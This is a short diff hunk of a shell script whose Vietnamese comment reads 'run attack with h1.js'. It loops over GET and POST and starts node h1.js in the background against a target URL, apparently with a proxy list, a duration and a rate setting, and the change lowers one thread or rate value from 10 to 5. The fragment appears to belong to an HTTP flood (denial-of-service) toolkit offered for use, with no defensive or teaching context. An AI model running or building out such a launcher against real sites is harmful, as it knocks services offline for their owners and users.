@@ -42,7 +42,7 @@ done
 
 # Chạy tấn công với h1.js
 for method in GET POST; do 
-  node h1.js "$method" "$URL" live.txt "$TIME" 128 10 randomstring=true &
+  node h1.js "$method" "$URL" live.txt "$TIME" 128 5 randomstring=true &
 done
 
 
